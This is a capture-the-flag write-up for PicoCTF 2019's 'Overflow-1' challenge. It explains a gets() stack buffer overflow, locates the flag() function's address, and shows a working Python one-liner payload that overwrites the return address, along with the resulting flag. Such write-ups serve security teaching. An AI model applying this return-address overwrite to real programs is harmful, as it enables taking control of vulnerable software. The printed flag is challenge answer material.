# PicoCTF 2019 - Overflow-1
Author: PinkNoize

Binary Exploitation - 150

> You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this program? You can find it in /problems/overflow-1_2_305519bf80dcdebd46c8950854760999 on the shell server.

## TL;DR

The challenge provides a program with a classic buffer overflow and a function to print the flag. To solve, overwrite a return address with the address of the flag function.

# Writeup

As with the previous challenges, we `cd` to the specified directory and find a protected flag file, a vulnerable program and the source for the program.

```bash
user@pico-2019-shell1:~$ cd /problems/overflow-1_2_305519bf80dcdebd46c8950854760999
user@pico-2019-shell1:/problems/overflow-1_2_305519bf80dcdebd46c8950854760999$ ls -al
total 92
drwxr-xr-x   2 root       root          4096 Sep 28  2019 .
drwxr-x--x 684 root       root         69632 Oct 10  2019 ..
-r--r-----   1 hacksports overflow-1_2    42 Sep 28  2019 flag.txt
-rwxr-sr-x   1 hacksports overflow-1_2  7532 Sep 28  2019 vuln
-rw-rw-r--   1 hacksports hacksports     742 Sep 28  2019 vuln.c
```

After reading the source code we find a similar vulnerability as in the previous challenge, the use of the `gets()`.

```c
void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}
```

As detailed in the description, we have to overflow `buf` and change the return address of `vuln()` to `flag()`. In the previous challenge, Overflow-0, we looked at the assembly to determine how far away the return address is from the buffer. This is time-consuming and unnecessary as we could repeat our target address a bunch and at some length we would overwrite the return address.

To start crafting this exploit we first need to know the address of the `flag()` function. We can find this by grepping the output of `readelf -s vuln`, which prints the symbol table of `vuln`.

```bash
user@pico-2019-shell1:/problems/overflow-1_2_305519bf80dcdebd46c8950854760999$ readelf -s vuln | grep flag
    74: 080485e6   121 FUNC    GLOBAL DEFAULT   14 flag
```

The address of the function is in the second column and is `0x080485e6`. Now we can craft our exploit by sending the program this address repeated a bunch of times. I chose 20 because 20*4 is bigger than 64 (the size of the buffer).

```bash
user@pico-2019-shell1:/problems/overflow-1_2_305519bf80dcdebd46c8950854760999$ python -c "print b'\x08\x04\x85\xe6'*20" | ./vuln 
Give me a string and lets see what happens: 
Woah, were jumping to 0xe6850408 !
Segmentation fault (core dumped)
```

Woah, the address we put was `0x080485e6` but for some reason it got `0xe6850408` which is the same address but reversed. This is due to the fact that x86 (the architecture these challenges are running on and probably your computer too) stores values in memory in ***little endian***. Little endian basically means that numbers and addresses are stored in memory in reverse order. Strings are still stored how you would expect them to be. This means that if we want `vuln()` to return to `0x080485e6`, we have to reverse the bytes to make them little endian.

```bash
user@pico-2019-shell1:/problems/overflow-1_2_305519bf80dcdebd46c8950854760999$ python -c "print b'\xe6\x85\x04\x08'*20" | ./vuln 
Give me a string and lets see what happens: 
Woah, were jumping to 0x80485e6 !
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a32b9368}Segmentation fault (core dumped)
```

Now that we reversed the bytes, the program returns to the `flag()` function and prints us the flag.